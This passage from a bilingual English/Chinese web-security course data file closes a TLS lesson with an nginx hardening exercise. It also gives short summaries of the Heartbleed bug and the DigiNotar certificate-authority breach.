      hint: L('nginx spells them TLSv1.2 and TLSv1.3, space-separated, ending with a semicolon.', 'nginx 中写作 TLSv1.2 和 TLSv1.3，用空格分隔，以分号结尾。'),
      solution: 'ssl_protocols TLSv1.2 TLSv1.3;',
      explain: L('TLS 1.0 and 1.1 were formally deprecated in 2021 (RFC 8996). Disabling them removes downgrade targets.', 'TLS 1.0 和 1.1 已于 2021 年被正式弃用（RFC 8996）。禁用它们就消除了降级的目标。'),
    },
  ],
  cases: [
    { year: '2014', ref: 'CVE-2014-0160', title: L('Heartbleed', '心脏出血（Heartbleed）'), what: L('A missing bounds check in OpenSSL’s TLS heartbeat extension let anyone ask a server to echo back up to 64 KB of its memory per request. That memory could contain session cookies, passwords and even the server’s private key. Huge numbers of sites had to patch and reissue certificates.', 'OpenSSL 的 TLS 心跳扩展缺少边界检查，任何人都能让服务器在每次请求中回显最多 64 KB 的内存。这些内存中可能包含会话 Cookie、密码，甚至服务器私钥。大量网站不得不打补丁并重新签发证书。'), lesson: L('A bug in the TLS library breaks the security of everything built on it.', 'TLS 库里的一个漏洞，会摧毁其上所有东西的安全性。') },
    { year: '2011', ref: L('DigiNotar', 'DigiNotar'), title: L('A compromised certificate authority', '被攻破的证书颁发机构'), what: L('Attackers broke into the Dutch CA DigiNotar and issued fraudulent certificates, including one for *.google.com, which was used to intercept traffic of users in Iran. Browsers removed DigiNotar from their trust stores and the company went bankrupt.', '攻击者入侵了荷兰证书颁发机构 DigiNotar，签发了伪造证书，其中包括一张 *.google.com 的证书，并被用来拦截伊朗用户的流量。各浏览器把 DigiNotar 从信任库中移除，该公司随后破产。'), lesson: L('Trust in TLS is only as strong as the weakest trusted CA; Certificate Transparency now makes mis-issuance visible.', 'TLS 的信任取决于最弱的那个受信任 CA；如今证书透明度（CT）让错误签发变得可见。') },
  ],
};

export const CLIENT3 = { csrf, cors, clickjacking, dom, websockets, tls };
